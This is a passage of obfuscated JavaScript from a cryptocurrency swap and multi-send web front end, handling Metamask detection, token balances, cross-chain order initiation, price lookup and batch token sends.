console[_0x151250(0x3bb)]('Metamask\x20not\x20detected'), $(_0x151250(0x2de))[_0x151250(0x383)]('<div\x20class=\x27alert\x20alert-warning\x27\x20role=\x27alert\x27>\x20<a\x20\x20\x20href=\x27https://metamask.io/\x27>Metamask\x20not\x20install,Click\x20to\x20Install\x20Metamask\x20First</a></div>'), $(_0x151250(0x327))['hide'](); }); async function addTokenList() { var _0x2419a5 = _0x47d6b7, _0xc01363 = document[_0x2419a5(0x333)]('SelectISend'); console[_0x2419a5(0x3bb)](_0x2419a5(0x29b), Coins), USDIn = Coins[SenderNetworkID][_0x2419a5(0x1e0)], USDOut = Coins[RecieverNetworkID][_0x2419a5(0x1e0)], console[_0x2419a5(0x3bb)](_0x2419a5(0x2b6), USDIn), console[_0x2419a5(0x3bb)](_0x2419a5(0x314), USDOut); let _0x35c8b8 = 'img/icon/' + Coins[SenderNetworkID]['ID'] + _0x2419a5(0x358), _0x5b0004 = _0x2419a5(0x2fc) + Coins[RecieverNetworkID]['ID'] + _0x2419a5(0x358), _0x4d5c18 = _0x2419a5(0x318), _0x3cfbd1 = _0x2419a5(0x318); document[_0x2419a5(0x333)](_0x2419a5(0x2ab))[_0x2419a5(0x2a0)] = _0x35c8b8, document['getElementById'](_0x2419a5(0x20b))[_0x2419a5(0x332)] = Coins[SenderNetworkID]['Name'] + '⌄', document[_0x2419a5(0x333)](_0x2419a5(0x3bf))[_0x2419a5(0x2a0)] = _0x5b0004, document['getElementById'](_0x2419a5(0x2a7))['innerHTML'] = Coins[RecieverNetworkID][_0x2419a5(0x1fa)] + '⌄'; var _0x2f2540 = ''; _0xc01363 !== null && $[_0x2419a5(0x3cd)](Coins, function (_0x4c7cbe) { var _0x560848 = _0x2419a5; console[_0x560848(0x3bb)](Coins[_0x4c7cbe][_0x560848(0x1fa)]), _0x2f2540 += '<a\x20\x20name=\x22', _0x2f2540 += Coins[_0x4c7cbe][_0x560848(0x1e0)], _0x2f2540 += '\x22\x20', _0x2f2540 += _0x560848(0x395), _0x2f2540 += Coins[_0x4c7cbe]['ID'], _0x2f2540 += '\x27', _0x2f2540 += ',', _0x2f2540 += '\x27', _0x2f2540 += Coins[_0x4c7cbe][_0x560848(0x1e0)], _0x2f2540 += _0x560848(0x24b); let _0x18d8c1 = _0x560848(0x2fc) + Coins[_0x4c7cbe]['ID'] + _0x560848(0x358), _0x386493 = _0x560848(0x318); _0x2f2540 += _0x560848(0x283), _0x2f2540 += _0x18d8c1, _0x2f2540 += _0x560848(0x212), _0x2f2540 = _0x2f2540 + _0x560848(0x31c) + _0x560848(0x284), _0x2f2540 += Coins[_0x4c7cbe][_0x560848(0x1fa)], _0x2f2540 += _0x560848(0x373); }); var _0x13ad26 = ''; _0xc01363 !== null && $[_0x2419a5(0x3cd)](Coins, function (_0xb516c0) { var _0x19c6e2 = _0x2419a5; _0x13ad26 += _0x19c6e2(0x2fb), _0x13ad26 += Coins[_0xb516c0][_0x19c6e2(0x1e0)], _0x13ad26 += '\x22\x20', _0x13ad26 += _0x19c6e2(0x23f), _0x13ad26 += Coins[_0xb516c0]['ID'], _0x13ad26 += '\x27', _0x13ad26 += ',', _0x13ad26 += '\x27', _0x13ad26 += Coins[_0xb516c0][_0x19c6e2(0x1e0)], _0x13ad26 += '\x27)\x22\x20/>'; let _0x20a0bf = _0x19c6e2(0x2fc) + Coins[_0xb516c0]['ID'] + _0x19c6e2(0x358), _0x8421ab = _0x19c6e2(0x318); _0x13ad26 += _0x19c6e2(0x283), _0x13ad26 += _0x20a0bf, _0x13ad26 += '\x22\x20width=\x2230\x22\x20height=\x2230\x22\x20', _0x13ad26 = _0x13ad26 + '\x20onerror=\x22this.src=\x20\x20\x27default.png\x27\x20\x20\x22\x20' + '\x20/>', _0x13ad26 += Coins[_0xb516c0][_0x19c6e2(0x1fa)], _0x13ad26 += '</a>'; }), $('#FromListContent')[_0x2419a5(0x2eb)](_0x2f2540), $(_0x2419a5(0x301))[_0x2419a5(0x2eb)](_0x13ad26); } async function Swap() { var _0x1111ed = _0x47d6b7; document[_0x1111ed(0x333)](_0x1111ed(0x2a3))[_0x1111ed(0x3c2)] = parseInt(document['getElementById'](_0x1111ed(0x1f2))[_0x1111ed(0x3c2)]), document[_0x1111ed(0x333)]('ISendInput')[_0x1111ed(0x3c2)] = parseInt(document[_0x1111ed(0x333)](_0x1111ed(0x1f2))['value']); var _0x2229d0 = await CheckValue(); if (_0x2229d0 === ![]) { console['log'](_0x1111ed(0x2e1), _0x2229d0); return; } console[_0x1111ed(0x3bb)]('SenderNetworkID:', SenderNetworkID), console[_0x1111ed(0x3bb)]('RecieverNetworkID:', RecieverNetworkID), ISendobj = document[_0x1111ed(0x333)](_0x1111ed(0x2ff)), IWantobj = document[_0x1111ed(0x333)](_0x1111ed(0x20f)); if (SenderNetworkID[_0x1111ed(0x21e)]() == RecieverNetworkID[_0x1111ed(0x21e)]() || document['getElementById'](_0x1111ed(0x2a3))[_0x1111ed(0x3c2)] == '') { console[_0x1111ed(0x3bb)](_0x1111ed(0x3a6)), $(_0x1111ed(0x234))[_0x1111ed(0x383)](_0x1111ed(0x3a6)); return; } if (document['getElementById']('IWantInput')[_0x1111ed(0x3c2)] > MaxTradeUSD) { console[_0x1111ed(0x3bb)](_0x1111ed(0x2b3)), $('#Tips')[_0x1111ed(0x383)]('*Stock\x20is\x20not\x20enough'); return; } if (NeedApproveToken) { console[_0x1111ed(0x3bb)](_0x1111ed(0x288), NeedApproveToken), $(_0x1111ed(0x234))[_0x1111ed(0x383)](_0x1111ed(0x2f1)); return; } var _0x42635e = await detectEthereumNetwork(SenderNetworkID); console['log'](_0x1111ed(0x3cf), _0x42635e); if (_0x42635e) { console['log'](_0x1111ed(0x3bd), contractAdress), console[_0x1111ed(0x3bb)]('after\x20choose\x20network,contract\x20Adress\x20is\x20:', Coins[SenderNetworkID]['ContractAddress']), $(_0x1111ed(0x22d))[_0x1111ed(0x29e)](); var _0x3499b8 = await InitOrder(); } } async function InitOrder() { var _0x1c3d39 = _0x47d6b7; console[_0x1c3d39(0x3bb)](_0x1c3d39(0x320), contractAdress); var _0x44e1e2 = parseInt(RecieverNetworkID)[_0x1c3d39(0x21e)](), _0x6cac1a = parseInt(String(document[_0x1c3d39(0x333)](_0x1c3d39(0x1f2))[_0x1c3d39(0x3c2)]))[_0x1c3d39(0x21e)](); if (_0x6cac1a < 0x3) { $(_0x1c3d39(0x234))[_0x1c3d39(0x383)]('Amount\x20Must\x20greater\x20Than\x202'), $('#loader1')[_0x1c3d39(0x2d7)](); return; } console[_0x1c3d39(0x3bb)]('_NetworkIDIniterWant:', _0x44e1e2), console[_0x1c3d39(0x3bb)](_0x1c3d39(0x35c), _0x6cac1a), _Contract = await new web3[(_0x1c3d39(0x245))][(_0x1c3d39(0x235))](SmartContractABI, Coins[SenderNetworkID][_0x1c3d39(0x2f2)], { 'from': web3['currentProvider'][_0x1c3d39(0x2bc)] }), await _Contract['methods']['initiate'](_0x44e1e2, _0x6cac1a)[_0x1c3d39(0x3b7)]({ 'from': web3['currentProvider'][_0x1c3d39(0x2bc)] }, function (_0x52d118, _0x5d35a7) { var _0x582a8b = _0x1c3d39; !_0x52d118 ? (console['log'](_0x582a8b(0x2c9), _0x5d35a7), $(_0x582a8b(0x22d))[_0x582a8b(0x2d7)]()) : (console[_0x582a8b(0x3bb)](_0x582a8b(0x215)), _0x52d118[_0x582a8b(0x1e3)][_0x582a8b(0x3b4)](_0x582a8b(0x2b1)) && (console[_0x582a8b(0x3bb)](_0x582a8b(0x2b1)), $(_0x582a8b(0x22d))[_0x582a8b(0x2d7)]())); })['once'](_0x1c3d39(0x28d), function (_0x33d351) { var _0x484020 = _0x1c3d39; console['log'](_0x484020(0x382), _0x33d351); var _0x3f2dbf = _0x33d351, _0xeecccd = _0x33d351[_0x484020(0x292)](0x0, 0x14) + _0x484020(0x271); $(_0x484020(0x234))[_0x484020(0x383)]('Transaction\x20Hash:\x20\x20' + _0x484020(0x330) + Coins[SenderNetworkID][_0x484020(0x3af)] + _0x484020(0x1f7) + _0x3f2dbf + _0x484020(0x387) + _0xeecccd + '</a>'); })[_0x1c3d39(0x37b)]('receipt', function (_0x427803) { var _0x4f4ef3 = _0x1c3d39; console[_0x4f4ef3(0x3bb)](_0x4f4ef3(0x2a9), _0x427803), document['getElementById']('Tips')[_0x4f4ef3(0x2d9)][_0x4f4ef3(0x372)] = _0x4f4ef3(0x2a8); }); } async function UpdateInfo() { var _0x2d5df4 = _0x47d6b7; try { await UpdateInfoDetail(); } catch (_0x1616a1) { $(_0x2d5df4(0x360))[_0x2d5df4(0x3c4)](_0x2d5df4(0x229)), $(_0x2d5df4(0x33e))[_0x2d5df4(0x2d7)](), $(_0x2d5df4(0x234))[_0x2d5df4(0x383)](''), $(_0x2d5df4(0x220))[_0x2d5df4(0x383)](''), document['getElementById'](_0x2d5df4(0x1f2))['disabled'] = ![], console['log'](_0x2d5df4(0x228), _0x1616a1); } } async function UpdateInfoDetail() { var _0x4c282b = _0x47d6b7; document['getElementById']('ISendInput')[_0x4c282b(0x229)] = !![], console[_0x4c282b(0x3bb)](_0x4c282b(0x2cf)), $(_0x4c282b(0x33e))[_0x4c282b(0x29e)](), $(_0x4c282b(0x360))[_0x4c282b(0x2d7)](); var _0x1a7a2c = _0x4c282b(0x21b) + Coins[SenderNetworkID][_0x4c282b(0x3af)] + _0x4c282b(0x347) + Coins[SenderNetworkID][_0x4c282b(0x1e0)] + _0x4c282b(0x334) + 'ⓘ' + _0x4c282b(0x344), _0x22cff0 = _0x4c282b(0x21b) + Coins[RecieverNetworkID][_0x4c282b(0x3af)] + _0x4c282b(0x347) + Coins[RecieverNetworkID][_0x4c282b(0x1e0)] + _0x4c282b(0x334) + 'ⓘ' + _0x4c282b(0x344); $(_0x4c282b(0x1ea))[_0x4c282b(0x383)](_0x1a7a2c), $(_0x4c282b(0x324))[_0x4c282b(0x383)](_0x22cff0), ISendobj = document[_0x4c282b(0x333)](_0x4c282b(0x2ff)), IWantobj = document[_0x4c282b(0x333)](_0x4c282b(0x20f)); let _0x4bcb22 = document[_0x4c282b(0x333)]('FromButton')[_0x4c282b(0x332)][_0x4c282b(0x331)]('⌄', ''), _0x30268d = document[_0x4c282b(0x333)](_0x4c282b(0x2a7))[_0x4c282b(0x332)][_0x4c282b(0x331)]('⌄', ''); console[_0x4c282b(0x3bb)]('FromString:', _0x4bcb22), console[_0x4c282b(0x3bb)](_0x4c282b(0x207), _0x30268d); if (parseFloat(document['getElementById'](_0x4c282b(0x1f2))[_0x4c282b(0x3c2)]) > 0x0 && document[_0x4c282b(0x333)](_0x4c282b(0x20b))[_0x4c282b(0x332)] != document[_0x4c282b(0x333)]('ToButton')[_0x4c282b(0x332)]) { console['log'](_0x4c282b(0x2a6), parseFloat(document['getElementById'](_0x4c282b(0x1f2))[_0x4c282b(0x3c2)])), $('#RouterTable')[_0x4c282b(0x383)](''), $('#Tips')['html'](_0x4c282b(0x24f)), $(_0x4c282b(0x1f5))[_0x4c282b(0x266)]('disabled', _0x4c282b(0x229)), $('#UserChooseCoinAddress')[_0x4c282b(0x383)](''), $(_0x4c282b(0x1ea))[_0x4c282b(0x383)](''), document[_0x4c282b(0x333)]('IWantInput')[_0x4c282b(0x3c2)] = '', $(_0x4c282b(0x2b5))[_0x4c282b(0x383)](_0x4c282b(0x24f)), $('#RecieveBalance')[_0x4c282b(0x383)](_0x4c282b(0x24f)), console[_0x4c282b(0x3bb)](_0x4c282b(0x261), document[_0x4c282b(0x333)](_0x4c282b(0x1f2))['value']); var _0x1a7a2c = _0x4c282b(0x21b) + Coins[SenderNetworkID][_0x4c282b(0x3af)] + _0x4c282b(0x347) + USDIn + _0x4c282b(0x334) + 'ⓘ' + _0x4c282b(0x344), _0x22cff0 = _0x4c282b(0x21b) + Coins[RecieverNetworkID][_0x4c282b(0x3af)] + _0x4c282b(0x347) + USDOut + _0x4c282b(0x334) + 'ⓘ' + _0x4c282b(0x344); $('#UserFromCoinAddress')['append'](_0x1a7a2c), $('#UserChooseCoinAddress')[_0x4c282b(0x2eb)](_0x22cff0), console['log'](_0x4c282b(0x2da), USDIn), console[_0x4c282b(0x3bb)]('SelectIWant:', USDOut); let _0x4563a0 = 0x1, _0x5c39bc = '0'; var _0x5d5b88 = new Web3(new Web3['providers'][(_0x4c282b(0x26b))](Coins[SenderNetworkID][_0x4c282b(0x24d)])); TokenContract = await new _0x5d5b88['eth'][(_0x4c282b(0x235))](TokenSmartContractABI, Coins[SenderNetworkID][_0x4c282b(0x1e0)], { 'from': web3[_0x4c282b(0x1e4)][_0x4c282b(0x2bc)] }); var _0x3a12f6 = await TokenContract[_0x4c282b(0x322)][_0x4c282b(0x3b3)]()[_0x4c282b(0x3c5)](); console[_0x4c282b(0x3bb)](_0x4c282b(0x1fb), _0x3a12f6); var _0x4d3417 = parseFloat(parseFloat(document[_0x4c282b(0x333)](_0x4c282b(0x1f2))[_0x4c282b(0x3c2)])['toFixed'](_0x3a12f6)); document[_0x4c282b(0x333)](_0x4c282b(0x1f2))[_0x4c282b(0x3c2)] = _0x4d3417; var _0x44d4ed = Math[_0x4c282b(0x35a)](0xa, parseInt(_0x3a12f6)), _0x3fcda1 = await TokenContract[_0x4c282b(0x322)]['balanceOf'](web3[_0x4c282b(0x1e4)][_0x4c282b(0x2bc)])['call'](); _0x3fcda1 > 0x0 ? USDInFinalBalance = (_0x3fcda1 / _0x44d4ed)['toString']() : USDInFinalBalance = '0'; MyTokenBalance = USDInFinalBalance, USDInAddress = USDIn, ChooseSendTokenAddress = USDInAddress, console[_0x4c282b(0x3bb)](_0x4c282b(0x1fe), USDInAddress); var _0x26f2f3 = _0x4c282b(0x21b) + Coins[SenderNetworkID][_0x4c282b(0x3af)] + _0x4c282b(0x347) + USDIn + _0x4c282b(0x334) + Coins[SenderNetworkID][_0x4c282b(0x241)] + _0x4c282b(0x344); await getApproveStatus(web3[_0x4c282b(0x1e4)][_0x4c282b(0x2bc)], Coins[SenderNetworkID]['ContractAddress']), $(_0x4c282b(0x2b5))[_0x4c282b(0x383)](_0x4c282b(0x3a0) + _0x26f2f3 + '\x20Balance:\x20' + parseFloat(USDInFinalBalance)['toFixed'](0x2)), Coins[SenderNetworkID][_0x4c282b(0x24d)], LeftCoinBalance = USDInFinalBalance; } await GetTokenBlance(RecieverNetworkID), $(_0x4c282b(0x234))[_0x4c282b(0x383)](''), $(_0x4c282b(0x1f5))[_0x4c282b(0x3c4)]('disabled'), $('#loader2')[_0x4c282b(0x2d7)](), document[_0x4c282b(0x333)](_0x4c282b(0x1f2))[_0x4c282b(0x229)] = ![], $('#TradeNowButton')[_0x4c282b(0x29e)](); } async function ActiveTokenContract() { var _0x4c806e = _0x47d6b7; $('#transactionHashLabel')[_0x4c806e(0x383)](''); try { const _0x123e2f = web3['utils'][_0x4c806e(0x2be)](document[_0x4c806e(0x333)](_0x4c806e(0x35e))[_0x4c806e(0x3c2)]); } catch (_0x4aa5db) { console[_0x4c806e(0x30d)]('invalid\x20ethereum\x20address', _0x4aa5db['message']), TokenContractAddress = document[_0x4c806e(0x333)]('TokenAddress')['value'], document[_0x4c806e(0x333)](_0x4c806e(0x35e))[_0x4c806e(0x229)] = ![], $(_0x4c806e(0x386))[_0x4c806e(0x383)]('Token\x20Address\x20Wrong'); return; } $(_0x4c806e(0x386))['html']('Loading...'), document['getElementById']('TokenAddress')['disabled'] = !![]; var _0xbeb791 = document[_0x4c806e(0x333)](_0x4c806e(0x35e))[_0x4c806e(0x3c2)]; TokenContract = await new web3[(_0x4c806e(0x245))][(_0x4c806e(0x235))](TokenSmartContractABI, _0xbeb791, { 'from': web3[_0x4c806e(0x1e4)]['selectedAddress'] }), console['log'](_0x4c806e(0x21d), TokenContract), console[_0x4c806e(0x3bb)](_0x4c806e(0x2d2), contractAdress), console[_0x4c806e(0x3bb)](_0x4c806e(0x22a), _0xbeb791), getApproveStatus(web3[_0x4c806e(0x1e4)]['selectedAddress'], contractAdress); var _0x29ea21 = await balanceOf(web3[_0x4c806e(0x1e4)][_0x4c806e(0x2bc)], TokenContract); } async function QueryAllAdapters(_0x15472e, _0x37007c, _0x543950, _0x25c1e4) { var _0x2da0e2 = _0x47d6b7; console[_0x2da0e2(0x3bb)](_0x2da0e2(0x274), _0x37007c), console[_0x2da0e2(0x3bb)](_0x2da0e2(0x2c0), _0x543950), console['log'](_0x2da0e2(0x1f9), _0x25c1e4); var _0xff7505 = Math[_0x2da0e2(0x35a)](0xa, parseInt(_0x15472e)), _0x29e78e; let _0x3b96a5 = [], _0x33f643 = await myContract[_0x2da0e2(0x322)][_0x2da0e2(0x34a)]()['call'](); for (let _0x5fba59 = 0x0; _0x5fba59 < _0x33f643; _0x5fba59++) { let _0x39b39d = 0x0, _0xb3c429 = await myContract[_0x2da0e2(0x322)][_0x2da0e2(0x336)](_0x37007c[_0x2da0e2(0x21e)](), _0x543950[_0x2da0e2(0x21e)](), _0x25c1e4[_0x2da0e2(0x21e)](), _0x5fba59)[_0x2da0e2(0x3c5)](), _0x35cd52 = await myContract[_0x2da0e2(0x322)][_0x2da0e2(0x34f)](_0x5fba59)[_0x2da0e2(0x3c5)](); console[_0x2da0e2(0x3bb)]('adapterAddress:', _0x35cd52), console['log'](_0x2da0e2(0x35d), _0xb3c429); var _0x5e4e71 = await toPlainString(_0xb3c429 / _0xff7505); _0xb3c429 > 0x0 ? (_0x29e78e = await toPlainString(_0xb3c429 / _0xff7505), console[_0x2da0e2(0x3bb)](_0x2da0e2(0x2d6), _0x5e4e71)) : _0x29e78e = '0'; var _0x2a37fa, _0x1b9ed6, _0xb4bf99; $[_0x2da0e2(0x3cd)](UseAdapters, function (_0x43aa11) { var _0x26a845 = _0x2da0e2; if (_0x35cd52[_0x26a845(0x3cc)]() == UseAdapters[_0x43aa11][_0x26a845(0x1f6)][_0x26a845(0x3cc)]()) { _0x2a37fa = UseAdapters[_0x43aa11][_0x26a845(0x299)], console[_0x26a845(0x3bb)](_0x26a845(0x249), UseAdapters[_0x43aa11][_0x26a845(0x299)]); return; } }), $[_0x2da0e2(0x3cd)](Coins, function (_0x13fdf0) { var _0x2810b4 = _0x2da0e2; if (_0x543950 == Coins[_0x13fdf0][_0x2810b4(0x1f6)]) { _0x1b9ed6 = Coins[_0x13fdf0][_0x2810b4(0x1fa)], console[_0x2810b4(0x3bb)]('_USDIn\x20', Coins[_0x13fdf0]['Name']); return; } }), $[_0x2da0e2(0x3cd)](Coins, function (_0x454f27) { var _0x2e0ae7 = _0x2da0e2; if (_0x25c1e4 == Coins[_0x454f27][_0x2e0ae7(0x1f6)]) { _0xb4bf99 = Coins[_0x454f27][_0x2e0ae7(0x1fa)], console[_0x2e0ae7(0x3bb)](_0x2e0ae7(0x276), Coins[_0x454f27]['Name']); return; } }); var _0x167e81 = _0x1b9ed6[_0x2da0e2(0x21e)]() + '/' + _0xb4bf99[_0x2da0e2(0x21e)](); console[_0x2da0e2(0x3bb)]('adapterName:', _0x2a37fa), _0x3b96a5['push']([_0x2a37fa, _0x167e81, _0x29e78e]); } _0x3b96a5['sort'](function (_0x302ab7, _0x238bd5) { return _0x238bd5[0x2] - _0x302ab7[0x2]; }), console[_0x2da0e2(0x3bb)](_0x2da0e2(0x244), _0x3b96a5); let _0x38fab1 = await ShowPrices(_0x3b96a5); } async function toPlainString(_0x4daa17) { return ('' + +_0x4daa17)['replace'](/(-?)(\d*)\.?(\d*)e([+-]\d+)/, function (_0x383d28, _0x587368, _0x3616ee, _0x13178f, _0x189b5a) { var _0x2e4cae = _0x2aa2; return _0x189b5a < 0x0 ? _0x587368 + '0.' + Array(0x1 - _0x189b5a - _0x3616ee[_0x2e4cae(0x253)])[_0x2e4cae(0x2ca)](0x0) + _0x3616ee + _0x13178f : _0x587368 + _0x3616ee + _0x13178f + Array(_0x189b5a - _0x13178f[_0x2e4cae(0x253)] + 0x1)[_0x2e4cae(0x2ca)](0x0); }); } async function ShowPrices() { var _0x21aac1 = _0x47d6b7; await myContract['methods']['ShowLastOrders'](0x1)[_0x21aac1(0x3c5)]({ 'from': web3[_0x21aac1(0x1e4)][_0x21aac1(0x2bc)] }, function (_0x2646fb, _0x2dc721) { var _0xddd3e9 = _0x21aac1; if (!_0x2646fb) { console[_0xddd3e9(0x3bb)]('Current\x20network\x20:\x20', SenderNetworkID), console['log'](_0xddd3e9(0x33c), _0x2dc721), $(_0xddd3e9(0x298))['html'](''); let _0xaa6b45 = ''; $[_0xddd3e9(0x3cd)](_0x2dc721, function (_0x4931c5) { var _0x19248b = _0xddd3e9; console[_0x19248b(0x3bb)](_0x19248b(0x326), _0x2dc721[_0x4931c5][0x0]); var _0x13841e = _0x2dc721[_0x4931c5]['initiator'][_0x19248b(0x292)](0x0, 0x6) + _0x19248b(0x271), _0x3e5e63 = Coins[_0x2dc721[_0x4931c5][_0x19248b(0x3a1)]][_0x19248b(0x1fa)]; if (_0x4931c5 == 0x0) { _0xaa6b45 += _0x19248b(0x279), _0xaa6b45 += _0x19248b(0x2ac), _0xaa6b45 += '<img\x20width=\x2225\x22\x20height=\x2225\x22\x20src=\x22', _0xaa6b45 += _0x19248b(0x252) + _0x2dc721[_0x4931c5][_0x19248b(0x3a1)] + _0x19248b(0x358), _0xaa6b45 += _0x19248b(0x2a1), _0xaa6b45 += _0x3e5e63, _0xaa6b45 += _0x19248b(0x1fd), _0xaa6b45 += _0x13841e, _0xaa6b45 += _0x19248b(0x1f3); var _0x255b50 = _0x2dc721[_0x4931c5]['AmountIniterWant']; _0x255b50 == '0' && (_0x255b50 = '-'), _0xaa6b45 += _0x255b50, _0xaa6b45 += _0x19248b(0x2d1); } else { _0xaa6b45 += _0x19248b(0x27c), _0xaa6b45 += _0x19248b(0x2ac), _0xaa6b45 += '<img\x20width=\x2225\x22\x20height=\x2225\x22\x20src=\x22', _0xaa6b45 += _0x19248b(0x252) + _0x2dc721[_0x4931c5][_0x19248b(0x3a1)] + _0x19248b(0x358), _0xaa6b45 += '\x22>\x20', _0xaa6b45 += _0x3e5e63, _0xaa6b45 += '</th><td>', _0xaa6b45 += _0x13841e; var _0x255b50 = _0x2dc721[_0x4931c5][_0x19248b(0x3bc)]; _0x255b50 == '0' && (_0x255b50 = '-'), _0xaa6b45 += '</td><td>', _0xaa6b45 += _0x255b50, _0xaa6b45 += _0x19248b(0x2d1); } }), $(_0xddd3e9(0x298))[_0xddd3e9(0x2eb)](_0xaa6b45); } else console['log']('smart\x20contract\x20error', _0x2646fb); }); } function SelectOptionChange() { var _0x1b30aa = _0x47d6b7; SelectOptionIDOBJ = document[_0x1b30aa(0x333)](_0x1b30aa(0x233)), console[_0x1b30aa(0x3bb)](SelectOptionIDOBJ[_0x1b30aa(0x37d)][SelectOptionIDOBJ['selectedIndex']][_0x1b30aa(0x3c2)]), detectEthereumNetwork(SelectOptionIDOBJ[_0x1b30aa(0x37d)][SelectOptionIDOBJ[_0x1b30aa(0x31b)]][_0x1b30aa(0x3c2)]); } async function GetEvents(_0x1a10dd, _0x24215b) { var _0x4a899a = _0x47d6b7, _0x4587cd; await _0x1a10dd[_0x4a899a(0x1f4)](_0x4a899a(0x221), { 'fromBlock': 0x17df81, 'toBlock': _0x4a899a(0x25b) })[_0x4a899a(0x2dd)](_0x3f0b1e => _0x4587cd = _0x3f0b1e)[_0x4a899a(0x29c)](_0x3fe4a2 => console[_0x4a899a(0x30d)](_0x3fe4a2)); var _0x284155 = _0x4587cd; console['log'](_0x284155), templateString = _0x4a899a(0x325) + _0x4a899a(0x2e6) + _0x4a899a(0x23d) + _0x4a899a(0x1fc) + _0x4a899a(0x258) + '\x20</tr>', $['each'](_0x284155, function (_0x551c7c) { var _0x5099ad = _0x4a899a; _0x284155[_0x551c7c][_0x5099ad(0x277)][_0x5099ad(0x369)] == '1' && _0x284155[_0x551c7c][_0x5099ad(0x277)][_0x5099ad(0x3a1)] == _0x24215b && (templateString += _0x5099ad(0x380) + _0x284155[_0x551c7c]['returnValues']['NetworkIDIniterWant'] + _0x5099ad(0x1f3) + web3[_0x5099ad(0x294)][_0x5099ad(0x224)](_0x284155[_0x551c7c][_0x5099ad(0x277)]['AmountIniterWant'], _0x5099ad(0x305)) + _0x5099ad(0x1f3) + web3[_0x5099ad(0x294)]['fromWei'](_0x284155[_0x551c7c][_0x5099ad(0x277)][_0x5099ad(0x368)], _0x5099ad(0x305)) + _0x5099ad(0x1f3) + _0x284155[_0x551c7c][_0x5099ad(0x277)][_0x5099ad(0x21a)] + _0x5099ad(0x340) + _0x5099ad(0x3ad)); }), templateString += _0x4a899a(0x3a3), $(_0x4a899a(0x3c0))['append'](templateString); } async function getPairPrice() { var _0x2c286d = _0x47d6b7, _0x2c627b = ISendobj[_0x2c286d(0x37d)][ISendobj[_0x2c286d(0x31b)]][_0x2c286d(0x3c2)], _0x329ea0 = IWantobj[_0x2c286d(0x37d)][IWantobj[_0x2c286d(0x31b)]][_0x2c286d(0x3c2)]; console[_0x2c286d(0x3bb)](_0x2c286d(0x357), _0x2c627b), console['log'](_0x2c286d(0x2dc), _0x329ea0), FetchURL = _0x2c286d(0x351), console[_0x2c286d(0x3bb)](_0x2c286d(0x246), FetchURL), fetch(FetchURL)[_0x2c286d(0x2dd)](_0xb1ef7d => _0xb1ef7d[_0x2c286d(0x34c)]())[_0x2c286d(0x2dd)](_0xe23d3e => { var _0x5c3519 = _0x2c286d, _0x5d8eaf = _0xe23d3e[_0x5c3519(0x36f)]['usd'], _0x56e509 = _0xe23d3e[_0x5c3519(0x365)][_0x5c3519(0x269)], _0x256570 = _0xe23d3e[_0x5c3519(0x1ff)][_0x5c3519(0x269)]; console['log'](_0x5c3519(0x328), _0x5d8eaf), console[_0x5c3519(0x3bb)](_0x5c3519(0x311), _0x56e509), console[_0x5c3519(0x3bb)](_0x5c3519(0x32d), _0x256570); var _0x4ff814, _0xa6d87; if (_0x2c627b == '56') _0x4ff814 = _0x56e509; else { if (_0x2c627b == _0x5c3519(0x256)) _0x4ff814 = _0x256570; else _0x2c627b == '1' && (_0x4ff814 = _0x5d8eaf); } if (_0x329ea0 == '56') _0xa6d87 = _0x56e509; else { if (_0x329ea0 == _0x5c3519(0x256)) _0xa6d87 = _0x256570; else _0x329ea0 == '1' && (_0xa6d87 = _0x5d8eaf); } return console[_0x5c3519(0x3bb)](_0x5c3519(0x343), _0x4ff814), console['log']('IWantPrice:', _0xa6d87), PriceResult = _0x4ff814 / _0xa6d87, console[_0x5c3519(0x3bb)](_0x5c3519(0x374), PriceResult['toFixed'](0x12)), $(_0x5c3519(0x29f))['html'](PriceResult[_0x5c3519(0x2df)](0x12)), ISendInputChange(), PriceResult; }); } async function SendMultiToken() { var _0x35d504 = _0x47d6b7; console[_0x35d504(0x3bb)](_0x35d504(0x213)); if (CurrentTokenDecimals == 0x0 && document[_0x35d504(0x333)]('SendTokenRadioID')['checked']) { $(_0x35d504(0x234))[_0x35d504(0x383)](_0x35d504(0x1e7)), $('#loader1')[_0x35d504(0x2d7)](); return; } var _0x551534 = document[_0x35d504(0x333)](_0x35d504(0x3c3)); console[_0x35d504(0x3bb)]('fileUpload:', _0x551534); if (typeof FileReader === _0x35d504(0x2ba)) { $(_0x35d504(0x234))['html'](_0x35d504(0x303)), $(_0x35d504(0x329))[_0x35d504(0x383)](''), $(_0x35d504(0x22d))[_0x35d504(0x2d7)](); return; } if (document[_0x35d504(0x333)](_0x35d504(0x346))[_0x35d504(0x3ba)] && (document[_0x35d504(0x333)](_0x35d504(0x38d))[_0x35d504(0x3c2)] == '' || document[_0x35d504(0x333)](_0x35d504(0x2ae))[_0x35d504(0x3c2)] == '')) { $(_0x35d504(0x234))['html'](_0x35d504(0x236)), $(_0x35d504(0x22d))[_0x35d504(0x2d7)](); return; } console[_0x35d504(0x3bb)](_0x35d504(0x2bf), document[_0x35d504(0x333)](_0x35d504(0x38d))['value']), console['log'](_0x35d504(0x267), CurrentTokenDecimals), console[_0x35d504(0x3bb)]('init\x20order\x20contractAdress:', contractAdress); var _0x37d750 = [], _0x1ec408 = [], _0x3bbd73 = 0x0; if (document[_0x35d504(0x333)]('SendSameAmountRadio')['checked']) { var _0x23f780 = $(_0x35d504(0x2ee))['val']()[_0x35d504(0x335)](/\n/); _0x37d750 = [], _0x1ec408 = []; for (var _0x58c98f = 0x0; _0x58c98f < _0x23f780[_0x35d504(0x253)]; _0x58c98f++) { /\S/['test'](_0x23f780[_0x58c98f]) && (_0x37d750[_0x35d504(0x240)]($[_0x35d504(0x2e8)](_0x23f780[_0x58c98f])), _0x1ec408['push'](BigInt(document[_0x35d504(0x333)](_0x35d504(0x38d))[_0x35d504(0x3c2)] * Math['pow'](0xa, CurrentTokenDecimals[_0x35d504(0x21e)]()))['toString']()), _0x3bbd73 = BigInt(_0x3bbd73) + BigInt(document[_0x35d504(0x333)](_0x35d504(0x38d))[_0x35d504(0x3c2)] * Math[_0x35d504(0x35a)](0xa, CurrentTokenDecimals['toString']())), SendFee = (BigInt(_0x3bbd73) + BigInt(ContractFee) + BigInt(web3[_0x35d504(0x294)]['toWei'](BeeFee[_0x35d504(0x21e)]())))[_0x35d504(0x21e)]()); } console[_0x35d504(0x3bb)]('TotalETH:', _0x3bbd73); } else { console[_0x35d504(0x3bb)](_0x35d504(0x36b)), _0x37d750 = [], _0x1ec408 = []; let _0x4e0c57 = await ReadCSVtoArray(); console[_0x35d504(0x3bb)](_0x35d504(0x389), _0x4e0c57); if (typeof _0x4e0c57 == _0x35d504(0x2ba)) { console[_0x35d504(0x3bb)](_0x35d504(0x39c)), $('#Tips')[_0x35d504(0x383)](_0x35d504(0x342)), $(_0x35d504(0x329))[_0x35d504(0x383)](''), 